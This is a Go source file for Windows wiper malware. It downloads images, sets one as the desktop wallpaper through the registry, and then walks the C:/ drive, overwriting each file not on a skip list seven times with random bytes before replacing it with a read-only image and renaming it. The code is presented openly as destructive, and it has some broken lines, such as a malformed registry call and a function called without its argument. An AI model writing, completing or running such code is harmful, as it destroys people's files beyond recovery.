package main


import (
	"golang.org/x/sys/windows/registry"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)


type imageStruct struct {
	image []byte
	name string
}


// List of image urls to pull from
var IMAGELINKS = []string{"", "", ""}

// List of directories to leave alone
var DIRBLACKLIST = []string{"", "", ""}

// List of files to leave alone
var FILEBLACKLIST = []string{"", "", ""}


// Check if string is present in arrary of strings
func strInArray(item string, strArray []string) bool {
	for i := 0; i < len(strArray); i++ {
		if item == strArray[i] { return true }
	}
	return false
}

func getImages(links []string) ([]imageStruct) {
	var images = make([]imageStruct, 0, len(links))

	for i := 0; i < len(links); i++ {
		var image []byte
		var splitpath []string

		// Make get request for image
		response, e := http.Get(links[i])
		if e != nil { goto err }
		
		// Pull actual image body and name
		image, e = ioutil.ReadAll(response.Body)
		splitpath = strings.Split(IMAGELINKS[i], "/")			
		if e != nil { goto err }


		// goto because I can
		err:
		if e != nil { continue } else {
			// Assign image and path to list
			images = append(images, imageStruct{image:image, name:splitpath[len(splitpath) - 1]})
		}
	}

	return images
}

// Currently VERRRRRY Windows Specific
func setBackground(image imageStruct) {
	// First create the file to reference
	name := filepath.Join("C:/", image.name)
	ioutil.WriteFile(name, image.image, 0444)

	// Then set the registry key for the background
	key, _ := registry.CURRENT_USER, `Control Panel\Desktop`, registry.QUERY_VALUE)
	defer key.Close()
	_ = key.SetStringValue("Wallpaper", name)
}

// Overwrite the file 7 times with random bytes because reasons
func scorch(path string, size int64) {
	for i := 0; i < 7; i++ {
		replacement := make([]byte, size)
		rand.Read(replacement)
		ioutil.WriteFile(path, replacement, 0644)
	}
}


func replaceFiles(root string, images []imageStruct) {
	filepath.Walk(root, func (path string, info os.FileInfo, e error) error {
		// Make sure the file path doesn't have any errors
		if e != nil {
			return e
		}

		// Handle directories
		if info.IsDir() {
			// Skip Blacklisted directories
			if strInArray(path, DIRBLACKLIST) {
				return filepath.SkipDir
			} else {
				return nil
			}
		}

		// If we make it here it is a file
		// If the file is in the whitelist, skip it
		if strInArray(path, FILEBLACKLIST) {
			return nil
		}

		// Now we do bad things to the file
		scorch(path, info.Size())

		// Choose an image and overwrite the original location with it
		image := images[rand.Intn(len(images) - 1)]
		e = ioutil.WriteFile(path, image.image, 0444)
		newpath := filepath.Join(filepath.Dir(path), image.name)
		os.Rename(path, newpath)

		// Either there was an error writing the file or we are good
		return e
	})
}

// We are doing this in one file because that's all it needs
func main() {
	rand.Seed(time.Now().UnixNano())
	// Get images
	images := getImages(IMAGELINKS)

	// Set Desktop Background
	setBackground()

	// Replace Files
	replaceFiles("C:/", images)
}